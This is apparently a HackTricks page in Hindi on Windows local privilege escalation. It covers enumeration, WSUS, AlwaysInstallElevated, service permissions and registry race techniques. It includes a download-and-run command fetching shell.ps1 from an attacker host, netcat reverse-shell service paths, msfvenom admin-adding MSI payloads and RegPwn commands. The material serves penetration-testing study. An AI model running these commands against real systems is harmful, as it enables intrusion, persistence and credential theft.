# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vectors खोजने के लिए सबसे अच्छा tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## प्रारंभिक Windows Theory

### Access Tokens

**अगर आपको नहीं पता कि Windows Access Tokens क्या हैं, तो आगे बढ़ने से पहले निम्न page पढ़ें:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs के बारे में अधिक जानकारी के लिए निम्न page देखें:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**अगर आपको नहीं पता कि Windows में integrity levels क्या होते हैं, तो आगे बढ़ने से पहले निम्न page पढ़ें:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows में अलग-अलग चीजें होती हैं जो **system को enumerate करने से रोक सकती हैं**, executables चला सकती हैं या यहाँ तक कि **आपकी गतिविधियों का पता लगा सकती हैं**। privilege escalation enumeration शुरू करने से पहले आपको **इन सभी defense mechanisms** को **पढ़ना** और **enumerate** करना चाहिए:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

`RAiLaunchAdminProcess` के जरिए लॉन्च किए गए UIAccess processes का दुरुपयोग करके prompts के बिना High IL तक पहुँचा जा सकता है, जब AppInfo secure-path checks bypass किए जाते हैं। संबंधित UIAccess/Admin Protection bypass workflow यहाँ देखें:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation का दुरुपयोग arbitrary SYSTEM registry write (RegPwn) के लिए किया जा सकता है:

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

हाल के Windows builds ने एक **SMB arbitrary-port** LPE path भी introduced किया है, जहाँ privileged local NTLM authentication को reused SMB TCP connection के over reflect किया जाता है:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## System Info

### Version info enumeration

जाँचें कि Windows version में कोई ज्ञात vulnerability है या नहीं (applied patches भी check करें)।
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

यह [site](https://msrc.microsoft.com/update-guide/vulnerability) Microsoft security vulnerabilities के बारे में detailed information खोजने के लिए उपयोगी है। इस database में 4,700 से अधिक security vulnerabilities हैं, जो एक Windows environment द्वारा प्रस्तुत **massive attack surface** को दिखाता है।

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

क्या env variables में कोई credential/Juicy info सेव है?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell History
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript फाइलें

आप [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) में जान सकते हैं कि इसे कैसे चालू किया जाए
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell pipeline executions के विवरण रिकॉर्ड किए जाते हैं, जिनमें executed commands, command invocations, और scripts के कुछ हिस्से शामिल होते हैं। हालांकि, complete execution details और output results शायद capture न हों।

इसे enable करने के लिए, documentation के "Transcript files" section में दिए गए instructions follow करें, और **"Powershell Transcription"** की बजाय **"Module Logging"** चुनें।
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell logs से आख़िरी 15 events देखने के लिए आप execute कर सकते हैं:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

स्क्रिप्ट के execution का complete activity और full content record capture किया जाता है, यह सुनिश्चित करते हुए कि code का हर block चलते समय documented हो। यह process हर activity का comprehensive audit trail preserve करती है, जो forensics और malicious behavior का analysis करने के लिए valuable है। Execution के समय सभी activity को document करके, process में detailed insights प्रदान किए जाते हैं।
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block के लिए logging events Windows Event Viewer में इस path पर पाए जा सकते हैं: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
पिछले 20 events देखने के लिए आप उपयोग कर सकते हैं:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### इंटरनेट सेटिंग्स
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ड्राइव्स
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

आप सिस्टम को compromise कर सकते हैं अगर updates http**S** के बजाय http का उपयोग करके request नहीं किए जाते हैं।

आप cmd में निम्नलिखित चलाकर शुरू करते हैं ताकि जांच सकें कि network non-SSL WSUS update उपयोग करता है या नहीं:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
या PowerShell में निम्नलिखित:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
अगर आपको इनमें से किसी जैसा जवाब मिलता है:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
और यदि `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` या `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` का मान `1` के बराबर है।

तो, **यह exploitable है।** यदि अंतिम registry का मान 0 के बराबर है, तो WSUS entry को ignore कर दिया जाएगा।

इन vulnerabilities को exploit करने के लिए आप [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) जैसे tools का उपयोग कर सकते हैं - ये MiTM weaponized exploits scripts हैं जो non-SSL WSUS traffic में 'fake' updates inject करते हैं।

Research यहाँ पढ़ें:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**पूरा report यहाँ पढ़ें**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
मूल रूप से, यह वही flaw है जिसे यह bug exploit करता है:

> यदि हमारे पास अपना local user proxy modify करने की power है, और Windows Updates Internet Explorer की settings में configured proxy का उपयोग करता है, तो हमारे पास [PyWSUS](https://github.com/GoSecure/pywsus) को locally run करने की power भी होती है ताकि हम अपना ही traffic intercept कर सकें और अपने asset पर elevated user के रूप में code run कर सकें।
>
> इसके अलावा, क्योंकि WSUS service current user की settings का उपयोग करती है, यह उसका certificate store भी उपयोग करेगी। यदि हम WSUS hostname के लिए एक self-signed certificate generate करें और इस certificate को current user के certificate store में add करें, तो हम HTTP और HTTPS दोनों WSUS traffic intercept कर पाएँगे। WSUS certificate पर trust-on-first-use type validation implement करने के लिए HSTS जैसी कोई mechanism उपयोग नहीं करता। यदि प्रस्तुत certificate user द्वारा trusted है और सही hostname रखता है, तो service उसे accept कर लेगी।

आप इस vulnerability को [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) tool का उपयोग करके exploit कर सकते हैं (एक बार यह liberated हो जाए)।

## Third-Party Auto-Updaters and Agent IPC (local privesc)

कई enterprise agents एक localhost IPC surface और एक privileged update channel expose करते हैं। यदि enrollment को attacker server की ओर coerce किया जा सके और updater किसी rogue root CA या weak signer checks पर trust करता हो, तो local user एक malicious MSI deliver कर सकता है जिसे SYSTEM service install करती है। एक generalized technique (Netskope stAgentSvc chain – CVE-2025-0309 पर आधारित) यहाँ देखें:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` **TCP/9401** पर एक localhost service expose करता है जो attacker-controlled messages process करती है, जिससे arbitrary commands **NT AUTHORITY\SYSTEM** के रूप में चलाए जा सकते हैं।

- **Recon**: listener और version confirm करें, जैसे `netstat -ano | findstr 9401` और `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: `VeeamHax.exe` जैसा PoC, आवश्यक Veeam DLLs के साथ, same directory में रखें, फिर local socket के माध्यम से SYSTEM payload trigger करें:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
सेवा कमांड को SYSTEM के रूप में निष्पादित करती है।
## KrbRelayUp

Windows **domain** environments में विशिष्ट स्थितियों के तहत एक **local privilege escalation** vulnerability मौजूद है। इन स्थितियों में ऐसे environments शामिल हैं जहाँ **LDAP signing is not enforced,** users के पास **self-rights** होते हैं जो उन्हें **Resource-Based Constrained Delegation (RBCD)** कॉन्फ़िगर करने की अनुमति देते हैं, और users के लिए domain के भीतर computers create करने की क्षमता होती है। यह नोट करना महत्वपूर्ण है कि ये **requirements** **default settings** का उपयोग करके पूरी होती हैं।

**exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) खोजें

attack के flow के बारे में अधिक जानकारी के लिए [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/) देखें

## AlwaysInstallElevated

**यदि** ये 2 registers **enabled** हैं (value **0x1** है), तो किसी भी privilege वाले users `*.msi` files को NT AUTHORITY\\**SYSTEM** के रूप में **install** (execute) कर सकते हैं।
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
If you have a meterpreter session you can automate this technique using the module **`exploit/windows/local/always_install_elevated`**

### PowerUP

`Write-UserAddMSI` कमांड का उपयोग power-up से करें ताकि current directory के अंदर एक Windows MSI binary बनाई जा सके और privileges escalate किए जा सकें। यह script एक precompiled MSI installer लिखती है जो user/group addition के लिए prompt करती है (इसलिए आपको GIU access की आवश्यकता होगी):
```
Write-UserAddMSI
```
बस बनाए गए binary को execute करें ताकि privileges escalate हो जाएँ।

### MSI Wrapper

यह ट्यूटोरियल पढ़ें ताकि आप इस tools का उपयोग करके MSI wrapper बनाना सीख सकें। ध्यान दें कि आप एक "**.bat**" file को wrap कर सकते हैं अगर आप सिर्फ **command lines** को **execute** करना चाहते हैं


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** with Cobalt Strike or Metasploit एक **new Windows EXE TCP payload** `C:\privesc\beacon.exe` में
- Open **Visual Studio**, **Create a new project** चुनें और search box में "installer" type करें। **Setup Wizard** project चुनें और **Next** पर click करें।
- Project को एक नाम दें, जैसे **AlwaysPrivesc**, location के लिए **`C:\privesc`** use करें, **place solution and project in the same directory** चुनें, और **Create** पर click करें।
- **Next** पर click करते रहें जब तक आप step 3 of 4 (choose files to include) तक न पहुँच जाएँ। **Add** पर click करें और अभी generate किया गया Beacon payload select करें। फिर **Finish** पर click करें।
- **Solution Explorer** में **AlwaysPrivesc** project highlight करें और **Properties** में **TargetPlatform** को **x86** से **x64** में बदलें।
- और भी properties हैं जिन्हें आप बदल सकते हैं, जैसे **Author** और **Manufacturer**, जो installed app को अधिक legitimate दिखा सकते हैं।
- Project पर right-click करें और **View > Custom Actions** select करें।
- **Install** पर right-click करें और **Add Custom Action** select करें।
- **Application Folder** पर double-click करें, अपनी **beacon.exe** file select करें और **OK** पर click करें। इससे यह सुनिश्चित होगा कि installer run होते ही beacon payload execute हो जाए।
- **Custom Action Properties** के तहत, **Run64Bit** को **True** में बदलें।
- अंत में, **build it**.
- अगर warning `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` दिखाई दे, तो सुनिश्चित करें कि आपने platform को x64 पर set किया है।

### MSI Installation

malicious `.msi` file की **installation** को background में execute करने के लिए:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
इस vulnerability का exploit करने के लिए आप use कर सकते हैं: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Audit Settings

ये settings decide करती हैं कि क्या **logged** किया जा रहा है, इसलिए आपको ध्यान देना चाहिए
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, यह जानना दिलचस्प है कि logs कहाँ भेजे जाते हैं
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** को **local Administrator passwords** के प्रबंधन के लिए डिज़ाइन किया गया है, यह सुनिश्चित करते हुए कि domain से जुड़े computers पर प्रत्येक password **unique, randomised, और regularly updated** हो। ये passwords securely **Active Directory** के भीतर stored होते हैं और केवल उन users द्वारा access किए जा सकते हैं जिन्हें ACLs के माध्यम से पर्याप्त permissions दी गई हैं, जिससे वे authorized होने पर local admin passwords देख सकें।


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

यदि active हो, तो **plain-text passwords LSASS** (Local Security Authority Subsystem Service) में stored होते हैं।\
[**WDigest के बारे में अधिक जानकारी इस page पर**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** से शुरू होकर, Microsoft ने Local Security Authority (LSA) के लिए enhanced protection introduced की, ताकि untrusted processes के **memory पढ़ने** या code inject करने के attempts को **block** किया जा सके, जिससे system और अधिक secure हो गया।\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### क्रेडेंशियल्स गार्ड

**Credential Guard** को **Windows 10** में पेश किया गया था। इसका उद्देश्य डिवाइस पर संग्रहीत credentials को pass-the-hash attacks जैसे खतरों से सुरक्षित रखना है।| [**Credentials Guard के बारे में अधिक जानकारी यहाँ।**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**डोमेन credentials** को **Local Security Authority** (LSA) द्वारा authenticate किया जाता है और operating system components द्वारा उपयोग किया जाता है। जब किसी user का logon data किसी registered security package द्वारा authenticate किया जाता है, तो आमतौर पर user के लिए domain credentials स्थापित किए जाते हैं।\
[**Cached Credentials के बारे में अधिक जानकारी यहाँ**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Users & Groups

### Users & Groups को enumerate करें

आपको जांचना चाहिए कि जिन groups में आप belong करते हैं, उनमें से किसी के पास interesting permissions हैं या नहीं
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privileged groups

अगर आप किसी privileged group के **belongs to** हैं, तो आप **privileges escalate** कर सकते हैं। privileged groups के बारे में और privileges escalate करने के लिए उनका abuse कैसे करें, यहाँ जानें:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Token** क्या है, इसके बारे में **और जानें** इस पेज में: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
interesting tokens के बारे में **जानने** और उनका abuse कैसे करें, इसके लिए निम्न पेज देखें:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Logged users / Sessions
```bash
qwinsta
klist sessions
```
### Home folders
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### पासवर्ड नीति
```bash
net accounts
```
### clipboard की सामग्री प्राप्त करें
```bash
powershell -command "Get-Clipboard"
```
## चल रहे Processes

### File और Folder Permissions

सबसे पहले, processes की listing करते समय **process की command line के अंदर passwords देखें**।\
जांचें कि क्या आप **चल रहे किसी binary को overwrite** कर सकते हैं या binary folder पर write permissions हैं ताकि संभावित [**DLL Hijacking attacks**](dll-hijacking/index.html) का exploitation किया जा सके:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
हमेशा चल रहे [**electron/cef/chromium debuggers**] की जाँच करें, आप इसका दुरुपयोग करके privileges escalate कर सकते हैं](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**processes binaries की permissions की जाँच**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**प्रोसेस बाइनरीज़ के फोल्डरों की permissions की जाँच करना (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### मेमोरी पासवर्ड माइनिंग

आप **procdump** from sysinternals का उपयोग करके चल रहे process का memory dump बना सकते हैं। FTP जैसी services के **credentials memory में clear text में** होते हैं, memory dump करने की कोशिश करें और credentials पढ़ें।
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### असुरक्षित GUI apps

**SYSTEM के रूप में चल रहे Applications एक user को CMD spawn करने, या directories browse करने की अनुमति दे सकते हैं।**

उदाहरण: "Windows Help and Support" (Windows + F1), "command prompt" खोजें, "Click to open Command Prompt" पर क्लिक करें

## Services

Service Triggers Windows को कुछ conditions होने पर service start करने देते हैं (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.). SERVICE_START rights के बिना भी आप अक्सर उनके triggers को fire करके privileged services start कर सकते हैं। enumeration और activation techniques यहाँ देखें:

-
{{#ref}}
service-triggers.md
{{#endref}}

Services की list प्राप्त करें:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### अनुमतियाँ

आप **sc** का उपयोग करके किसी service की जानकारी प्राप्त कर सकते हैं
```bash
sc qc <service_name>
```
प्रत्येक service के लिए required privilege level check करने के लिए _Sysinternals_ का binary **accesschk** होना recommended है।
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
यह अनुशंसा की जाती है कि जाँचें कि क्या "Authenticated Users" किसी service को modify कर सकते हैं:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[आप यहाँ से XP के लिए accesschk.exe डाउनलोड कर सकते हैं](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### सेवा सक्षम करें

अगर आपको यह error आ रहा है (उदाहरण के लिए SSDPSRV के साथ):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

आप इसे उपयोग करके सक्षम कर सकते हैं
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**ध्यान रखें कि service upnphost को काम करने के लिए SSDPSRV पर निर्भर रहना पड़ता है (XP SP1 के लिए)**

**इस समस्या का एक और workaround** है यह चलाना:
```
sc.exe config usosvc start= auto
```
### **सर्विस binary path संशोधित करें**

उस परिदृश्य में जहाँ "Authenticated users" समूह के पास किसी service पर **SERVICE_ALL_ACCESS** हो, service के executable binary में बदलाव संभव है। **sc** को संशोधित और execute करने के लिए:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### सेवा पुनः प्रारंभ करें
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
विशेषाधिकार विभिन्न permissions के माध्यम से escalated किए जा सकते हैं:

- **SERVICE_CHANGE_CONFIG**: service binary को reconfigure करने की अनुमति देता है।
- **WRITE_DAC**: permission reconfiguration सक्षम करता है, जिससे service configurations बदलने की क्षमता मिलती है।
- **WRITE_OWNER**: ownership acquisition और permission reconfiguration की अनुमति देता है।
- **GENERIC_WRITE**: service configurations बदलने की क्षमता inherit करता है।
- **GENERIC_ALL**: service configurations बदलने की क्षमता भी inherit करता है।

इस vulnerability की detection और exploitation के लिए, _exploit/windows/local/service_permissions_ का उपयोग किया जा सकता है।

### Services binaries weak permissions

**जांचें कि क्या आप उस binary को modify कर सकते हैं जो किसी service द्वारा execute की जाती है** या क्या आपके पास उस folder पर **write permissions** हैं जहाँ binary located है ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
आप **wmic** (system32 में नहीं) का उपयोग करके किसी service द्वारा execute की जाने वाली हर binary प्राप्त कर सकते हैं और **icacls** का उपयोग करके अपने permissions जांच सकते हैं:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
आप **sc** और **icacls** का भी उपयोग कर सकते हैं:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### सर्विसेज registry modify permissions

आपको जांचना चाहिए कि क्या आप किसी service registry को modify कर सकते हैं।\
आप किसी service registry पर अपनी permissions **check** कर सकते हैं इस तरह:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
यह जांचा जाना चाहिए कि **Authenticated Users** या **NT AUTHORITY\INTERACTIVE** के पास `FullControl` permissions हैं या नहीं। यदि हां, तो service द्वारा executed binary को बदला जा सकता है।

Executed binary का Path बदलने के लिए:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

कुछ Windows Accessibility features per-user **ATConfig** keys बनाती हैं, जिन्हें बाद में एक **SYSTEM** process द्वारा HKLM session key में copy किया जाता है। एक registry **symbolic link race** इस privileged write को **किसी भी HKLM path** पर redirect कर सकती है, जिससे arbitrary HKLM **value write** primitive मिलती है।

Key locations (example: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` installed accessibility features को सूचीबद्ध करता है।
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` user-controlled configuration store करता है।
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` logon/secure-desktop transitions के दौरान create होता है और user द्वारा writable होता है।

Abuse flow (CVE-2026-24291 / ATConfig):

1. उस **HKCU ATConfig** value को populate करें जिसे आप SYSTEM द्वारा write करवाना चाहते हैं।
2. secure-desktop copy trigger करें (e.g., **LockWorkstation**), जो AT broker flow शुरू करता है।
3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` पर एक **oplock** रखकर **race जीतें**; जब oplock fire हो, तो **HKLM Session ATConfig** key को एक protected HKLM target की **registry link** से replace करें।
4. SYSTEM attacker-chosen value को redirected HKLM path पर लिख देता है।

एक बार arbitrary HKLM value write मिल जाए, तो service configuration values overwrite करके LPE की ओर pivot करें:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

ऐसी service चुनें जिसे एक normal user start कर सकता हो (e.g., **`msiserver`**) और write के बाद उसे trigger करें। **Note:** public exploit implementation race का हिस्सा बनाकर **workstation लॉक** करती है।

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

यदि आपके पास किसी registry पर यह permission है, तो इसका मतलब है कि **आप इससे sub registries बना सकते हैं**। Windows services के मामले में, यह **arbitrary code execute करने के लिए पर्याप्त है:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

यदि किसी executable का path quotes के अंदर नहीं है, तो Windows हर space से पहले वाले ending को execute करने की कोशिश करेगा।

